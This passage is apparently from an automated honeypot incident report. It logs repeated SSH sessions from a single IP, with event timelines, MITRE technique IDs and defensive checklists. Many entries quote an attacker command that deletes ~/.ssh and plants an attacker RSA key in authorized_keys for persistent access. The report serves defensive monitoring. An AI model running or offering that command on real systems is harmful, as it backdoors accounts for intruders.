- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c8e7266829d

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:24 |
| **Last Seen** | 2026-05-05 15:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:24:35` | `cowrie.session.connect` |
| `2026-05-05 15:24:35` | `cowrie.client.version` |
| `2026-05-05 15:24:36` | `cowrie.client.kex` |
| `2026-05-05 15:24:36` | `cowrie.login.success` |
| `2026-05-05 15:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f7e27a6d31a

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:26 |
| **Last Seen** | 2026-05-05 15:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:26:39` | `cowrie.session.connect` |
| `2026-05-05 15:26:39` | `cowrie.client.version` |
| `2026-05-05 15:26:39` | `cowrie.client.kex` |
| `2026-05-05 15:26:39` | `cowrie.login.success` |
| `2026-05-05 15:26:40` | `cowrie.session.params` |
| `2026-05-05 15:26:40` | `cowrie.command.input` |
| `2026-05-05 15:26:40` | `cowrie.command.failed` |
| `2026-05-05 15:26:40` | `cowrie.log.closed` |
| `2026-05-05 15:26:40` | `cowrie.session.params` |
| `2026-05-05 15:26:40` | `cowrie.command.input` |
| `2026-05-05 15:26:40` | `cowrie.session.file_download` |
| `2026-05-05 15:26:40` | `cowrie.log.closed` |
| `2026-05-05 15:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6799226453b5

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:26 |
| **Last Seen** | 2026-05-05 15:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:26:42` | `cowrie.session.connect` |
| `2026-05-05 15:26:42` | `cowrie.client.version` |
| `2026-05-05 15:26:42` | `cowrie.client.kex` |
| `2026-05-05 15:26:42` | `cowrie.login.success` |
| `2026-05-05 15:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b19eaee58a72

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:29 |
| **Last Seen** | 2026-05-05 15:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:29:39` | `cowrie.session.connect` |
| `2026-05-05 15:29:39` | `cowrie.client.version` |
| `2026-05-05 15:29:39` | `cowrie.client.kex` |
| `2026-05-05 15:29:40` | `cowrie.login.success` |
| `2026-05-05 15:29:40` | `cowrie.session.params` |
| `2026-05-05 15:29:40` | `cowrie.command.input` |
| `2026-05-05 15:29:40` | `cowrie.command.failed` |
| `2026-05-05 15:29:40` | `cowrie.log.closed` |
| `2026-05-05 15:29:40` | `cowrie.session.params` |
| `2026-05-05 15:29:40` | `cowrie.command.input` |
| `2026-05-05 15:29:40` | `cowrie.session.file_download` |
| `2026-05-05 15:29:40` | `cowrie.log.closed` |
| `2026-05-05 15:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f6c61c5861

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:29 |
| **Last Seen** | 2026-05-05 15:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:29:42` | `cowrie.session.connect` |
| `2026-05-05 15:29:42` | `cowrie.client.version` |
| `2026-05-05 15:29:42` | `cowrie.client.kex` |
| `2026-05-05 15:29:42` | `cowrie.login.success` |
| `2026-05-05 15:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1117cfc4bed6

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:30 |
| **Last Seen** | 2026-05-05 15:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:30:37` | `cowrie.session.connect` |
| `2026-05-05 15:30:37` | `cowrie.client.version` |
| `2026-05-05 15:30:37` | `cowrie.client.kex` |
| `2026-05-05 15:30:37` | `cowrie.login.success` |
| `2026-05-05 15:30:38` | `cowrie.session.params` |
| `2026-05-05 15:30:38` | `cowrie.command.input` |
| `2026-05-05 15:30:38` | `cowrie.command.failed` |
| `2026-05-05 15:30:38` | `cowrie.log.closed` |
| `2026-05-05 15:30:38` | `cowrie.session.params` |
| `2026-05-05 15:30:38` | `cowrie.command.input` |
| `2026-05-05 15:30:38` | `cowrie.session.file_download` |
| `2026-05-05 15:30:38` | `cowrie.log.closed` |
| `2026-05-05 15:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b26b5c11cf

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:30 |
| **Last Seen** | 2026-05-05 15:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:30:40` | `cowrie.session.connect` |
| `2026-05-05 15:30:40` | `cowrie.client.version` |
| `2026-05-05 15:30:40` | `cowrie.client.kex` |
| `2026-05-05 15:30:40` | `cowrie.login.success` |
| `2026-05-05 15:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac7d0cf011b

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:32 |
| **Last Seen** | 2026-05-05 15:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:32:36` | `cowrie.session.connect` |
| `2026-05-05 15:32:36` | `cowrie.client.version` |
| `2026-05-05 15:32:36` | `cowrie.client.kex` |
| `2026-05-05 15:32:37` | `cowrie.login.success` |
| `2026-05-05 15:32:37` | `cowrie.session.params` |
| `2026-05-05 15:32:37` | `cowrie.command.input` |
| `2026-05-05 15:32:37` | `cowrie.command.failed` |
| `2026-05-05 15:32:37` | `cowrie.log.closed` |
| `2026-05-05 15:32:37` | `cowrie.session.params` |
| `2026-05-05 15:32:37` | `cowrie.command.input` |
| `2026-05-05 15:32:37` | `cowrie.session.file_download` |
| `2026-05-05 15:32:37` | `cowrie.log.closed` |
| `2026-05-05 15:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda861602459

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:32 |
| **Last Seen** | 2026-05-05 15:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:32:39` | `cowrie.session.connect` |
| `2026-05-05 15:32:39` | `cowrie.client.version` |
| `2026-05-05 15:32:39` | `cowrie.client.kex` |
| `2026-05-05 15:32:39` | `cowrie.login.success` |
| `2026-05-05 15:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-843fdf614d64

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:33 |
| **Last Seen** | 2026-05-05 15:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:33:37` | `cowrie.session.connect` |
| `2026-05-05 15:33:37` | `cowrie.client.version` |
| `2026-05-05 15:33:37` | `cowrie.client.kex` |
| `2026-05-05 15:33:38` | `cowrie.login.success` |
| `2026-05-05 15:33:38` | `cowrie.session.params` |
| `2026-05-05 15:33:38` | `cowrie.command.input` |
| `2026-05-05 15:33:38` | `cowrie.command.failed` |
| `2026-05-05 15:33:38` | `cowrie.log.closed` |
| `2026-05-05 15:33:38` | `cowrie.session.params` |
| `2026-05-05 15:33:38` | `cowrie.command.input` |
| `2026-05-05 15:33:38` | `cowrie.session.file_download` |
| `2026-05-05 15:33:38` | `cowrie.log.closed` |
| `2026-05-05 15:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55d9fd252a3

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:33 |
| **Last Seen** | 2026-05-05 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:33:40` | `cowrie.session.connect` |
| `2026-05-05 15:33:40` | `cowrie.client.version` |
| `2026-05-05 15:33:40` | `cowrie.client.kex` |
| `2026-05-05 15:33:41` | `cowrie.login.success` |
| `2026-05-05 15:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04565a66790c

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:34 |
| **Last Seen** | 2026-05-05 15:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:34:36` | `cowrie.session.connect` |
| `2026-05-05 15:34:36` | `cowrie.client.version` |
| `2026-05-05 15:34:36` | `cowrie.client.kex` |
| `2026-05-05 15:34:37` | `cowrie.login.success` |
| `2026-05-05 15:34:37` | `cowrie.session.params` |
| `2026-05-05 15:34:37` | `cowrie.command.input` |
| `2026-05-05 15:34:37` | `cowrie.command.failed` |
| `2026-05-05 15:34:37` | `cowrie.log.closed` |
| `2026-05-05 15:34:37` | `cowrie.session.params` |
| `2026-05-05 15:34:37` | `cowrie.command.input` |
| `2026-05-05 15:34:37` | `cowrie.session.file_download` |
| `2026-05-05 15:34:37` | `cowrie.log.closed` |
| `2026-05-05 15:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-514c0c94620a

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:34 |
| **Last Seen** | 2026-05-05 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:34:39` | `cowrie.session.connect` |
| `2026-05-05 15:34:39` | `cowrie.client.version` |
| `2026-05-05 15:34:39` | `cowrie.client.kex` |
| `2026-05-05 15:34:39` | `cowrie.login.success` |
| `2026-05-05 15:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f567116c42

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:39 |
| **Last Seen** | 2026-05-05 15:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:39:32` | `cowrie.session.connect` |
| `2026-05-05 15:39:32` | `cowrie.client.version` |
| `2026-05-05 15:39:32` | `cowrie.client.kex` |
| `2026-05-05 15:39:32` | `cowrie.login.success` |
| `2026-05-05 15:39:33` | `cowrie.session.params` |
| `2026-05-05 15:39:33` | `cowrie.command.input` |
| `2026-05-05 15:39:33` | `cowrie.command.failed` |
| `2026-05-05 15:39:33` | `cowrie.log.closed` |
| `2026-05-05 15:39:33` | `cowrie.session.params` |
| `2026-05-05 15:39:33` | `cowrie.command.input` |
| `2026-05-05 15:39:33` | `cowrie.session.file_download` |
| `2026-05-05 15:39:33` | `cowrie.log.closed` |
| `2026-05-05 15:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c1233737f52

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:39 |
| **Last Seen** | 2026-05-05 15:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:39:35` | `cowrie.session.connect` |
| `2026-05-05 15:39:35` | `cowrie.client.version` |
| `2026-05-05 15:39:35` | `cowrie.client.kex` |
| `2026-05-05 15:39:35` | `cowrie.login.success` |
| `2026-05-05 15:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7ff832278f

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:40 |
| **Last Seen** | 2026-05-05 15:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:40:31` | `cowrie.session.connect` |
| `2026-05-05 15:40:31` | `cowrie.client.version` |
| `2026-05-05 15:40:31` | `cowrie.client.kex` |
| `2026-05-05 15:40:31` | `cowrie.login.success` |
| `2026-05-05 15:40:31` | `cowrie.session.params` |
| `2026-05-05 15:40:31` | `cowrie.command.input` |
| `2026-05-05 15:40:31` | `cowrie.command.failed` |
| `2026-05-05 15:40:31` | `cowrie.log.closed` |
| `2026-05-05 15:40:32` | `cowrie.session.params` |
| `2026-05-05 15:40:32` | `cowrie.command.input` |
| `2026-05-05 15:40:32` | `cowrie.session.file_download` |
| `2026-05-05 15:40:32` | `cowrie.log.closed` |
| `2026-05-05 15:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e9fd2eb5b49

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:40 |
| **Last Seen** | 2026-05-05 15:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:40:33` | `cowrie.session.connect` |
| `2026-05-05 15:40:33` | `cowrie.client.version` |
| `2026-05-05 15:40:34` | `cowrie.client.kex` |
| `2026-05-05 15:40:34` | `cowrie.login.success` |
| `2026-05-05 15:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198ff5598fbe

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:41 |
| **Last Seen** | 2026-05-05 15:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
